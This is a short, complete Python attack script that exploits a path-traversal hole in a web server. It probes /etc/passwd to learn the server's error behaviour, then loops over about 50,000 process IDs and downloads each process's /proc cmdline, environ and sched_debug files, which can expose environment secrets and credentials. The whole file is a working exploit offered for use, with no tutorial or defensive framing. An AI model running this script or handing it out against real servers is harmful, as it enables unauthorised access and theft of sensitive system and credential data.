import os
import requests
import sys

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} PATH-TRAVERSAL-URL")
    exit(1)

url = sys.argv[1]
files = ["cmdline", "environ", "sched_debug"]

def find_error_mode(url :str):
    error_1 = requests.get(url + "/this/not/exists_1")
    error_2 = requests.get(url + "/this/not/exists_2")
    success_1 = requests.get(url + "/etc/passwd")
    if error_1.status_code == error_2.status_code != success_1.status_code:
        return {"mode": "status_code", "fail": error_1.status_code}
    else:
        return {"mode": "context", "fail": error_1.text}

def download_file(url: str, file_name :str):
    r = requests.get(url)
    os.makedirs(os.path.dirname(file_name), exist_ok=True)
    with open(file_name, 'wb') as f: 
        f.write(r.content)

def check_file(url: str, error_mode :dict):
    for id in range(1, 50000):
        for file in files:
            r = requests.get(url + f"/proc/{id}/{file}")
            if error_mode['mode'] == "status_code":
                if r.status_code != error_mode['fail']:
                    print(f"[+] Downloading file --> /proc/{id}/{file}")
                    download_file(url + f"/proc/{id}/{file}", "." + f"/proc/{id}/{file}")
            if error_mode['mode'] == "context":
                if r.text != error_mode['fail']:
                    print(f"[+] Downloading file --> /proc/{id}/{file}")
                    download_file(url + f"/proc/{id}/{file}", "." + f"/proc/{id}/{file}")

check_file(url, find_error_mode(url))